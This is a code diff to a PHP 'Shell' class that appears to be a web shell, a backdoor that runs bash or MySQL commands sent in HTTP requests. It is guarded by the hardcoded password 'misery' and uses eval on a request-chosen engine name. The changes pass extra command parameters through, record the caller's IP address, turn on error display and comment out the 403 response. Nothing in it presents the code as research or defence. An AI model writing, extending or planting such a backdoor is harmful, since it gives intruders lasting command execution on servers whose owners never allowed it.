@@ -168,7 +168,7 @@ class Shell{
 		if (isset($this->session->state->{'shell'})) {
 			$engine = $this->session->state->{'shell'};
 		}else{
-			$engine = $request['shell'];
+			$engine = isset($request['shell']) ? $request['shell'] : 'bash';
 		}
 		if (!in_array($engine, array('mysql', 'bash'))) {
 			$engine = 'bash';
@@ -176,6 +176,9 @@ class Shell{
         $this->engine = eval("return new $engine();");
         $this->engine->state = $this->session->state;
 		$this->request = $request;
+        if (!isset($this->request['params'])) {
+            $this->request['params'] = '';
+        }
 		return $this;
 	}
 	function resumeState() {
@@ -241,7 +244,7 @@ class Shell{
 				break;
 
 			case 'CMD':
-				$this->request['response'] = $this->engine->executeCmd($this->request['cmd']);
+				$this->request['response'] = $this->engine->executeCmd($this->request['cmd'] . ' ' . $this->request['params']);
 				$this->request['status_code'] = 200;
 				break;
 		}
@@ -249,13 +252,14 @@ class Shell{
 	}
 	function sendResponse(){
 		$this->request['debug_information'] = json_encode($_SESSION);
+        $this->request['connecting_from'] = json_encode($_SERVER['REMOTE_ADDR']);
 		if (isset($_POST['password'])) {
 			echo json_encode($this->request);
 		}
 		return $this;
 	}
 }
-@ini_set("display_errors", 0);
+@ini_set("display_errors", 1);
 define('PASSWORD', 'misery');
 define('USER', '~');
 $shell = new Shell($_REQUEST);
@@ -263,5 +267,5 @@ if ($shell->login()) {
 	$shell->resumeState()->executeCmd()->sendResponse();
 	die;
 }
-header('HTTP/1.1 403 Forbidden');
+//header('HTTP/1.1 403 Forbidden');
 //lol
